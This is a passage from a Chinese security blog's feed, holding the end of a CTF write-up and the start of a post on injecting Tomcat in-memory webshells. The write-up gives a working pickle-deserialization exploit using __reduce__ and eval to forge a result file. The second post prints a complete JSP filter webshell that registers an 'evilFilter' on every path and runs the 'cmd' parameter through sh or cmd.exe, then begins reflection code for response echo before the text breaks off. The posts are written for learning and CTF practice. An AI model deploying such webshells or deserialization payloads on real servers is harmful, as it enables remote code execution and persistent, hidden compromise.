class="built_in">open</span>(<span class="string">&quot;/tmp/result.json&quot;</span>, <span class="string">&quot;r&quot;</span>).read())</span><br></pre></td></tr></table></figure><p>在checkpoint目录下有训练好的model.pt，上传后误差很大（机器学习大佬可以考虑训练精准度很高的模型试着上传）</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106164754107.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106164754107.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221106164754107"></p><p>infer.py加载tags_10.pt对上传的model.pt进行预测，并在训练结束后把答案写进&#x2F;tmp&#x2F;result.json中，而在dataset里还有另一个模型，为pixels_10.pt（train.py训练模型的代码如下）。所以构造的关键就是向&#x2F;tmp&#x2F;result.json中写入标准的序列化模型。</p><p>本题所用的机器学习的知识仅有：训练是指创建模型，向模型展示标签样本，让模型学习特征和标签的关系；推断是指训练后的模型做出有用的预测。train.py便是创建模型。infer.py便是让模型做出预测。预测的标准答案就在pixels.pt里</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106174115925.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106174115925.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221106174115925"></p><p>所以payload如下：（因为eval代码执行和本身执行的原因，需要对\和单引号转义）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> matplotlib</span><br><span class="line"><span class="keyword">import</span> matplotlib.image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载正确答案</span></span><br><span class="line"></span><br><span class="line">pixel=<span class="string">&quot;pixels_10.pt&quot;</span></span><br><span class="line">predictions = torch.load(pixel, map_location=<span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向/tmp/result.json中写入正确数据</span></span><br><span class="line"></span><br><span class="line">gen_imgs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    out_io = io.BytesIO()</span><br><span class="line">    matplotlib.image.imsave(out_io, predictions[i].numpy(), <span class="built_in">format</span>=<span class="string">&quot;png&quot;</span>)</span><br><span class="line">    png_b64 = base64.b64encode(out_io.getvalue()).decode()</span><br><span class="line">    gen_imgs.append(png_b64)</span><br><span class="line"></span><br><span class="line">content = json.dumps(&#123;<span class="string">&quot;gen_imgs_b64&quot;</span>: gen_imgs&#125;)</span><br><span class="line"></span><br><span class="line">content.replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造要执行的 python 代码</span></span><br><span class="line"></span><br><span class="line">args = <span class="string">&quot;open(&#x27;/tmp/result.json&#x27;, &#x27;w&#x27;).write(&#x27;&quot;</span> + content + <span class="string">&quot;&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 __reduce__ 方法执行 python 代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (args,))</span><br><span class="line"></span><br><span class="line">torch.save(Exploit(), <span class="string">&quot;model_exp.pt&quot;</span>, _use_new_zipfile_serialization=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106210723891.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106210723891.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221106210723891"></p><p>将生成的model_exp.pt上传，就能匹配正确值</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106211047310.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106211047310.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221106211047310"></p><p>刚入门机器学习的，比如我，会遇到由于版本不对无法安装torch的问题，查看自己python支持的版本有三种方法，一个一个试：</p><p>1. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pip._internal.pep425tags</span><br><span class="line"><span class="built_in">print</span>(pip._internal.pep425tags.get_supported())</span><br></pre></td></tr></table></figure><p>2. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> wheel.pep425tags</span><br><span class="line">   <span class="built_in">print</span>(wheel.pep425tags.get_supported())</span><br></pre></td></tr></table></figure><p>3. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip debug --verbose</span><br></pre></td></tr></table></figure><p>不过最大的问题是torch在32位的python下是无法正常工作的，需要装64位的python，只需要把64位python的系统变量写在32位之上(python和script)。整了一晚上，太坑了</p><p>还有一种手法不需要正确的答案，而是用前面定义的参数（也就是正确的n_tags,dim,img_shape）写入到&#x2F;tmp&#x2F;result.json，但是后面的json.dump和open也会执行，所以进行了绕过。具体见大佬博客：<code>https://blog.tonycrane.cc/p/169d9f3d.html#%E4%BA%8C%E6%AC%A1%E5%85%83%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C</code></p><p>最后一个你先别急sqlite注入可以用验证码识别进行布尔盲注，或者手工，但是会慢一点，很多大佬都写过了。</p><p>参考链接：<code>https://exexute.github.io/2019/04/24/how-hacking-with-LaTex/</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf WP </tag>
            
            <tag> web </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 机器学习 </tag>
            
            <tag> python反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>结合CC11进行Tomcat内存马注入</title>
      <link href="/2022/03/12/jie-he-cc11-jin-xing-tomcat-nei-cun-ma-zhu-ru/"/>
      <url>/2022/03/12/jie-he-cc11-jin-xing-tomcat-nei-cun-ma-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="结合CC链注入真无文件Tomcat内存马"><a href="#结合CC链注入真无文件Tomcat内存马" class="headerlink" title="结合CC链注入真无文件Tomcat内存马"></a>结合CC链注入真无文件Tomcat内存马</h1><p>Tomcat内存马基础可以看我的上一篇：<a href="https://www.0kai0.cn/?p=240">https://www.0kai0.cn/?p=240</a></p><h2 id="前言-fliter等内存马局限"><a href="#前言-fliter等内存马局限" class="headerlink" title="前言-fliter等内存马局限"></a>前言-fliter等内存马局限</h2><p>具体新建servlet的过程：<a href="https://blog.csdn.net/gaoqingliang521/article/details/108677301">https://blog.csdn.net/gaoqingliang521/article/details/108677301</a></p><p>新建一个servlet:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">servlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException&#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello servlet&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置tomcat：应用程序上下文表示http访问servlet的地址，这里就是localhost:8080&#x2F;servlet</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226195245120.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226195245120.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221226195245120"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226200309488.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226200309488.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221226200309488"></p><p>自定义的filter:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filterDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter 初始化创建&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行过滤操作&quot;</span>);</span><br><span class="line">      </span><br><span class="line">       filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改web.xml，指定url-pattern为<code>/demo</code>，也就是访问<a href="http://localhost:8080/servlet/demo%E6%97%B6%E8%A7%A6%E5%8F%91filter%EF%BC%8C%E4%B8%80%E7%9B%B4%E5%88%B7%E6%96%B0%E4%B8%80%E7%9B%B4%E8%A7%A6%E5%8F%91">http://localhost:8080/servlet/demo时触发filter，一直刷新一直触发</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.example.filterDemo<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/demo<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>分析之前在项目结构-&gt;模块-&gt;依赖里导入tomcat&#x2F;lib的包</p><p>Filter内存马代码：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filterTrojan.jsp</span></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContextFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">  <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">  <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">      <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">          isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        response.getWriter().write(output);</span><br><span class="line">        response.getWriter().flush();</span><br><span class="line">      &#125;</span><br><span class="line">      chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">  filterDef.setFilter(filter);</span><br><span class="line">  filterDef.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">  filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">  standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">  <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">  constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">  <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">  filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line">  filterConfigs.put(<span class="string">&quot;evilFilter&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">  <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">  filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">  filterMap.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">  filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">  standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">  out.println(<span class="string">&quot;Inject done&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先访问一遍jsp文件，就能在pattern任意路径带上参数RCE</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215628922.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215628922.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221227215628922"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215956900.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215956900.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221227215956900"></p><p>但是无论是模拟动态注册的filter内存马，还是Listener、Servlet、valve内存马，都不是真正意义上的内存马，它们会输出在tomcat的目录下</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229153959584.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229153959584.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221229153959584"></p><p>比如上述运行的jsp，在CTALINA_BASE环境的<code>work\Catalina\localhost\Servlet_web环境\org\apache\jsp</code>都有相应的文件</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229154145023.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229154145023.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221229154145023"></p><h2 id="Tomcat回显"><a href="#Tomcat回显" class="headerlink" title="Tomcat回显"></a>Tomcat回显</h2><p>​而且根据不同的封装，jsp都内置了不同的获取request和response的方法。比如filter可以用ServletRequest获取；Listener用ServletRequestEvent获取；Servlet用HttpServletRequest获取；valve管道更是直接使用request和response对象。所以不用考虑回显问题。</p><p>​但是反序列化通用的是注入字节码，要进行回显就需要获取request和response对象。</p><p>ApplicationFilterChain的lastServicedRequest 和 lastServicedResponse 都是静态变量。如果不是静态变量，还需要获取到对应的对象，才能获取到变量</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101113153631.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101113153631.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230101113153631"></p><p>在ApplicationFilterChain的static部分，static部分都是优先执行。ApplicationDispatcher.WRAP_SAME_OBJECT默认False，所以lastServicedRequest&#x2F;lastServicedResponse初始化为null</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101130436655.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101130436655.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230101130436655"></p><p>在104行，这里的ApplicationDispatcher.WRAP_SAME_OBJECT为true的话，就向ThreadLocal装入request和response</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101130853915.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101130853915.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230101130853915"></p><p>所以反射修改ApplicationDispatcher.WRAP_SAME_OBJECT，并且初始化ThreadLocal，就能进入if判断从而从这两个ThreadLocal获取request&#x2F;response</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">applicationDispatcher</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);</span><br><span class="line">                <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> applicationDispatcher.getDeclaredField(<span 